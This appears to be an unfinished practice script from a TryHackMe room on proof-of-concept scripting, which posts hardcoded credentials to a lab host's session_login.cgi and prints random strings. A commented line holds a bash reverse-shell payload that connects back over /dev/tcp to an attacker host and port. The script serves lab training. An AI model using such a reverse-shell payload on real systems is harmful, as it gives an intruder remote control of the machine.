#/usr/bin/env python
import requests
import random
import string
import secrets

# made in a THM room: POC scripting

#payload:
# payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"

ip_target = '10.10.135.37'
url = f"http://{ip_target}/session_login.cgi"
length = 5

r = requests.post(url, data={'page':"%2F",'user':'user1', 'pass':'1user'}, \
    cookies = {'testing':'1'}, verify=False, allow_redirects=False)


if r.status_code == 302 and r.cookies['sid'] != None:
    print('---login sucessful---')
else:
    print('xxxx login not sucessful xxxxx')

def rand_input():
    rand_char = ''.join(random.choices(string.ascii_letters+string.digits, k=5))
    return rand_char

for i in range(1, 20):
    print(rand_input())


# def rand_input():
#     rand_char = string.ascii_letters+string.digits
#     rand_string = ''.join(secrets.choice(rand_char) for i in range(5))
#     return rand_string

# for i in range(20):
#     print(rand_input())



# cookie = r.cookies['sid']

# print('sid=',cookie)